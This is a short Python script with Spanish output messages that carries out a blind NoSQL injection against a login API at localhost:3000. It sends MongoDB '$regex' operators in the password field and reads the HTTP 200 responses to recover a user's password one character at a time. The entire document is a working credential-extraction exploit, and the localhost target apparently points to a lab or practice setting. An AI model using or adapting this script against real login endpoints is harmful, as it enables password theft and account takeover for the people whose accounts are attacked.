import requests
import string

url = "http://localhost:3000/api/login"
headers = {'Content-Type': 'application/json'}
username = "usuario1"
password = ""

print(f"[*] Extrayendo contraseña del usuario {username}")

while True:
    found = False
    for char in string.printable:
        if char in ['*', '+', '.', '?', '|', '$']:
            continue
            
        payload = {
            "username": username,
            "password": {"$regex": f"^{password}{char}"}
        }
        
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            password += char
            print(f"[+] Carácter encontrado: {char} | Contraseña hasta ahora: {password}")
            found = True
            break
    
    if not found:
        print(f"[✓] Contraseña completa: {password}")
        break
